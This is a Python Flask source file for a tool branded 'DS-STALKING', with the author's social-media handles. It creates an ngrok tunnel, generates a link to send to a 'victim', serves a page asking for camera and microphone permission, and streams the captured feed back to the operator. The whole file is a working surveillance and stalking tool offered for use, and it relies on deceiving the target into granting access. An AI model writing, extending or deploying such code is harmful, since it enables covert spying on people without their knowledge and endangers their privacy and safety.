from flask import Flask, render_template, request, jsonify
import socket
import pyfiglet
from pyngrok import ngrok, conf  # Import de Ngrok

# Créer une interface ASCII art avec pyfiglet
def display_interface():
    custom_fig = pyfiglet.Figlet(font="small")
    ascii_art_text = custom_fig.renderText("DS-STALKING")
    info = [
        "BY: 2806",
        "Telegram: t.me/Mr_2806",
        "Tiktok: dedsec_x.0",
        "Youtube: Dedsec assistant"
    ]
    border = "=" * 40
    print(border)
    print(ascii_art_text)
    for line in info:
        print(f"  {line}")
    print(border)

# Afficher l'interface ASCII au démarrage
display_interface()

# Création de l'application Flask
app = Flask(__name__)

# Obtenir l'adresse IP locale
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

# Route pour la page principale
@app.route("/")
def index():
    return render_template("index.html")

# Route pour générer le lien à envoyer à la victime
@app.route("/generate_victim_link", methods=["POST"])
def generate_victim_link():
    input_link = request.form['input_link']
    
    # Lien Ngrok public généré
    public_url = ngrok.connect(5000).public_url  # Ngrok sur le port 5000
    victim_link = f"{public_url}/victim_permission"
    
    print(f"Lien généré pour la victime : {victim_link}")
    return render_template("generated_link.html", victim_link=victim_link)

# Route pour demander la permission de caméra et micro
@app.route("/victim_permission")
def victim_permission():
    return render_template("victim_permission.html")

# Route pour commencer le stream
@app.route("/start_stream", methods=["POST"])
def start_stream():
    stream_url = f"http://{local_ip}:5000/stream"
    return jsonify({"stream_url": stream_url})

# Route pour afficher le flux vidéo et audio
@app.route("/stream")
def stream():
    return render_template("stream.html")

# Lancer le serveur Flask
if __name__ == "__main__":
    # Ajouter le chemin vers Ngrok si nécessaire
    conf.get_default().ngrok_path = "/data/data/com.termux/files/usr/bin/ngrok"  # Remplacez par le chemin correct

    # Fixer un port unique
    port = 5000
    local_ip = get_local_ip()
    
    print(f"Serveur en cours d'exécution : http://{local_ip}:{port}")
    app.run(host="0.0.0.0", port=port)